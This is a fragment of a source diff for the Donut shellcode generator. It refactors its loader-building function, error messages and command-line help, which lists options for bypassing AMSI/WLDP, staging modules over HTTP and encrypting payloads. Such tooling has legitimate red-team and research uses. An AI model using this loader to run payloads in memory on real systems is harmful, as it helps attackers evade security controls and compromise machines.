+    DPRINT("Validation passed.");
+    return DONUT_ERROR_SUCCESS;
+}
+
+/**
+ * Function: DonutCreate
+ * ----------------------------
+ *   Builds a position-independent loader for VBS/JS/EXE/DLL files.
+ *
+ *   INPUT  : Pointer to a Donut configuration.
+ *
+ *   OUTPUT : Donut error code.
+ */
+EXPORT_FUNC 
+int DonutCreate(PDONUT_CONFIG c) {
+    int err = DONUT_ERROR_SUCCESS;
+    
+    DPRINT("Entering.");
+    
+    c->mod = c->pic = c->inst = NULL;
+    c->mod_len = c->pic_len = c->inst_len = 0;
+    
+    // 1. validate the loader configuration
+    err = validate_loader_cfg(c);
+    if(err == DONUT_ERROR_SUCCESS) {
+      // 2. get information about the file to execute in memory
+      err = read_file_info(c);
+      if(err == DONUT_ERROR_SUCCESS) {
+        // 3. validate the module configuration
+        err = validate_file_cfg(c);
+        if(err == DONUT_ERROR_SUCCESS) {
+          // 4. build the module
+          err = build_module(c);
+          if(err == DONUT_ERROR_SUCCESS) {
+            // 5. build the instance
+            err = build_instance(c);
+            if(err == DONUT_ERROR_SUCCESS) {
+              // 6. build the loader
+              err = build_loader(c);
+              if(err == DONUT_ERROR_SUCCESS) {
+                // 7. save loader and any additional files to disk
+                err = save_loader(c);
+              }
+            }
+          }
+        }
+      }
+    }
     // if there was some error, release resources
     if(err != DONUT_ERROR_SUCCESS) {
       DonutDelete(c);
     }
-    unmap_file(&fi);
-    DPRINT("Leaving.");
+    DPRINT("Leaving with error :  %" PRId32, err);
     return err;
 }
 
-// release resources allocated for configuration
+/**
+ * Function: DonutDelete
+ * ----------------------------
+ *   Releases memory allocated by internal Donut functions.
+ *
+ *   INPUT  : Pointer to a Donut configuration previously used by DonutCreate.
+ *
+ *   OUTPUT : Donut error code.
+ */
 EXPORT_FUNC 
 int DonutDelete(PDONUT_CONFIG c) {
     
@@ -1327,75 +1578,89 @@ int DonutDelete(PDONUT_CONFIG c) {
     }
     // free module
     if(c->mod != NULL) {
+      DPRINT("Releasing memory for module.");
       free(c->mod);
       c->mod = NULL;
     }
     // free instance
     if(c->inst != NULL) {
+      DPRINT("Releasing memory for configuration.");
       free(c->inst);
       c->inst = NULL;
     }
     // free loader
     if(c->pic != NULL) {
+      DPRINT("Releasing memory for loader.");
       free(c->pic);
       c->pic = NULL;
     }
+    unmap_file();
+    
     DPRINT("Leaving.");
     return DONUT_ERROR_SUCCESS;
 }
 
+/**
+ * Function: DonutError
+ * ----------------------------
+ *   Converts Donut error code into a string
+ *
+ *   INPUT  : error code returned by DonutCreate
+ *
+ *   OUTPUT : error code as a string 
+ */
 EXPORT_FUNC
 const char *DonutError(int err) {
     static const char *str="N/A";
     
     switch(err) {
       case DONUT_ERROR_SUCCESS:
-        str = "No error";
+        str = "No error.";
         break;
       case DONUT_ERROR_FILE_NOT_FOUND:
-        str = "File not found";
+        str = "File not found.";
         break;
       case DONUT_ERROR_FILE_EMPTY:
-        str = "File is empty";
+        str = "File is empty.";
         break;
       case DONUT_ERROR_FILE_ACCESS:
-        str = "Cannot open file";
+        str = "Cannot open file.";
         break;
       case DONUT_ERROR_FILE_INVALID:
-        str = "File is invalid";
+        str = "File is invalid.";
         break;      
       case DONUT_ERROR_NET_PARAMS:
-        str = "File is a .NET DLL. Donut requires a class and method";
+        str = "File is a .NET DLL. Donut requires a class and method.";
         break;
       case DONUT_ERROR_NO_MEMORY:
-        str = "No memory available";
+        str = "Memory allocation failed.";
         break;
       case DONUT_ERROR_INVALID_ARCH:
-        str = "Invalid architecture specified";
+        str = "Invalid architecture specified.";
         break;      
       case DONUT_ERROR_INVALID_URL:
-        str = "Invalid URL";
+        str = "Invalid URL.";
         break;
       case DONUT_ERROR_URL_LENGTH:
-        str = "Invalid URL length";
+        str = "Invalid URL length.";
         break;
       case DONUT_ERROR_INVALID_PARAMETER:
-        str = "Invalid parameter";
+        str = "Invalid parameter.";
         break;
       case DONUT_ERROR_RANDOM:
-        str = "Error generating random values";
+        str = "Error generating random values.";
         break;
       case DONUT_ERROR_DLL_FUNCTION:
-        str = "Unable to locate DLL function provided. Names are case sensitive";
+        str = "Unable to locate DLL function provided. Names are case sensitive.";
         break;
       case DONUT_ERROR_ARCH_MISMATCH:
-        str = "Target architecture cannot support selected DLL/EXE file";
+        str = "Target architecture cannot support selected DLL/EXE file.";
         break;
       case DONUT_ERROR_DLL_PARAM:
-        str = "You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function";
+        str = "You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function.";
         break;
       case DONUT_ERROR_BYPASS_INVALID:
-        str = "Invalid bypass option specified";
+        str = "Invalid bypass option specified.";
         break;
       case DONUT_ERROR_NORELOC:
         str = "This file has no relocation information required for in-memory execution.";
@@ -1412,7 +1677,11 @@ const char *DonutError(int err) {
       case DONUT_ERROR_INVALID_ENTROPY:
         str = "Invalid entropy level specified.";
         break;
+      case DONUT_ERROR_MIXED_ASSEMBLY:
+        str = "Mixed (native and managed) assemblies are currently unsupported.";
+        break;
     }
+    DPRINT("Error result : %s", str);
     return str;
 }
 
@@ -1435,30 +1704,30 @@ static void usage (void) {
     printf(" usage: donut [options] <EXE/DLL/VBS/JS>\n\n");
     printf("       Only the finest artisanal donuts are made of shells.\n\n");   
     printf("                   -MODULE OPTIONS-\n\n");
-    printf("       -n <name>            Module name. Randomly generated by default with entropy enabled.\n");
+    printf("       -n <name>            Module name for HTTP staging. If entropy is enabled, this is generated randomly.\n");
     printf("       -s <server>          HTTP server that will host the donut module.\n");
-    printf("       -e <level>           Entropy. 1=none, 2=use random names, 3=random names + symmetric encryption (default)\n\n");
+    printf("       -e <level>           Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default)\n\n");
     
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
-    printf("       -b <level>           Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)\n");
+    printf("       -b <level>           Bypass AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail.(default)\n");
     printf("       -o <path>            Output file to save loader. Default is \"loader.bin\"\n");
-    printf("       -f <format>          Output format. 1=binary (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex\n");
-    printf("       -y <oep>             Create a new thread for loader. Optionally execute original entrypoint of host process.\n");
-    printf("       -x <action>          Exiting. 1=exit thread (default), 2=exit process\n\n");
+    printf("       -f <format>          Output format. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=Powershell, 7=C#, 8=Hex\n");
+    printf("       -y <addr>            Create thread for loader and continue execution at <addr> supplied.\n");
+    printf("       -x <action>          Exiting. 1=Exit thread (default), 2=Exit process\n\n");
 
     printf("                   -FILE OPTIONS-\n\n");
     printf("       -c <namespace.class> Optional class name. (required for .NET DLL)\n");
-    printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default with entropy enabled.\n");
+    printf("       -d <name>            AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.\n");
     printf("       -m <method | api>    Optional method or function for DLL. (a method is required for .NET DLL)\n");
-    printf("       -p <parameters>      Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
+    printf("       -p <arguments>       Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
     printf("       -w                   Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\n");
     printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
-    printf("       -t                   Create new thread for entrypoint of unmanaged EXE.\n");
+    printf("       -t                   Execute the entrypoint of an unmanaged EXE as a thread.\n");
 #ifdef WINDOWS
-    printf("       -z <engine>          Pack/Compress file. 1=none, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman\n\n");
+    printf("       -z <engine>          Pack/Compress file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman\n\n");
 #else
-    printf("       -z <engine>          Pack/Compress file. 1=none, 2=aPLib\n\n");
+    printf("       -z <engine>          Pack/Compress file. 1=None, 2=aPLib\n\n");
 #endif
 
     printf(" examples:\n\n");
@@ -1475,7 +1744,7 @@ int main(int argc, char *argv[]) {
     int          i, err;
     char         *mod_type;
     char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
-    char         *inst_type[3]= { "Embedded", "HTTP", "DNS" };
+    char         *inst_type[2]= { "Embedded", "HTTP" };
     
     printf("\n");
     printf("  [ Donut shellcode generator v0.9.3\n");
